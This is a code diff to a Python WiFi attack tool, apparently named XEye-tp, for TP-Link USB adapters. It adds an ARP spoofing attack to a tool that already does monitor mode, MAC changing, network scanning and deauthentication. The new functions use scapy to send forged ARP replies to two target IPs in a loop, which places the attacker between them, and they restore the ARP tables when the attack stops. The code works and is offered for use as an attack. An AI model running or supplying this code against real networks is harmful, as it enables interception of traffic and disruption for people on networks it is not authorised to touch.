@@ -58,10 +58,11 @@ def Start():
     time.sleep(1)
     print("\n\n [Info] --> With XEye-tp tool, you can do the following: \n")
     time.sleep(2)
-    print(" \t[*] --> 1) Change your WiFi USB adapter TP-Link model WN722N v2 and v3 to Monitor and Injection mode easily and in few minutes or even seconds :) ")
-    print(" \t[*] --> 2) You can easily change the Mac address after your TP-Link WiFi USB is set to monitor mode directly through the tool :) ")
-    print(" \t[*] --> 3) Scan the network and get all the devices Mac addresses easily if the Adapter is connected to that network  :) ")
-    print(" \t[*] --> 4) You can perform Deauthintication attack :) ")
+    print(" \t[*] --> 1) Change your WiFi USB adapter TP-Link model WN722N v2 and v3 to Monitor and Injection mode easily and in few minutes or even seconds ")
+    print(" \t[*] --> 2) You can easily change the Mac address after your TP-Link WiFi USB is set to monitor mode directly through the tool ")
+    print(" \t[*] --> 3) Scan the network and get all the devices Mac addresses easily if the Adapter is connected to that network ")
+    print(" \t[*] --> 4) You can perform Deauthintication attack ")
+    print(" \t[*] --> 5) You can perform ARP spoofing attack ")
     time.sleep(3)
     Intf = getinterf()
     print("\n\n[Info] --> A TP-Link USB WIFI adapter is detected \n\n")
@@ -391,7 +392,53 @@ def printr(ipss):
     print("\n The IP \t\t The Mac Address\n ---------------------------------------------------------")
     for nn in ipss:
         print(nn["ips"]+"\t\t"+nn["mac"])
-    TheEnd()
+    time.sleep(2)
+    askii = input("\n\n [Asking] --> Would you like to start ARP spoofing attack? ")
+    if askii.lower() == 'y' or askii.lower() == 'yes':
+        arpspoof()
+    elif askii.lower() == 'n' or askii.lower() == 'no':
+        time.sleep(1)
+        TheEnd()
+    else:
+        invalid()
+def arpspoof():
+    ipo = input("[Required] --> The first target's IP: ")
+    iptw = input("[Required] --> The second target's IP: ")
+    time.sleep(1)
+    integ = 6
+    print("[Info] --> ARP Spoofing attack is started ....")
+    time.sleep(1)
+    print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" more than once")
+    try:
+        while True:
+            spoofing(ipo, iptw)
+            spoofing(iptw, ipo)
+            print("\r ARP Spoofing packets sent: "+str(integ), end="")
+            integ += 6
+    except:
+        print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
+        mact = getm(ipo)
+        macs = getm(iptw)
+        packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=macs)
+        sc.send(packetre,verbose=False,count=3)
+        packetree = sc.ARP(op=2,hwdst=macs,pdst=iptw,psrc=ipo,hwsrc=mact)
+        sc.send(packetree, verbose=False, count=3)
+        print("[Info] --> All the ARP tables of the targets are restored ")
+        time.sleep(2)
+        exit()
+
+
+def getm(ip):
+    targetn = sc.ARP(pdst=ip)
+    targeth = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
+    comb = targeth/targetn
+    anss = sc.srp(comb,verbose=False,timeout=3)[0]
+    return anss[0][1].hwsrc
+def spoofing(ipt, ips):
+    mact = getm(ipt)
+    spacket = sc.ARP(pdst=ipt,psrc=ips,op=2,hwdst=mact)
+    sc.send(spacket,count=3,verbose=False)
+
 def invalid():
     lines()
     print(" [warning] --> Invalid entry, please use a yes or no answer, Exiting .....")
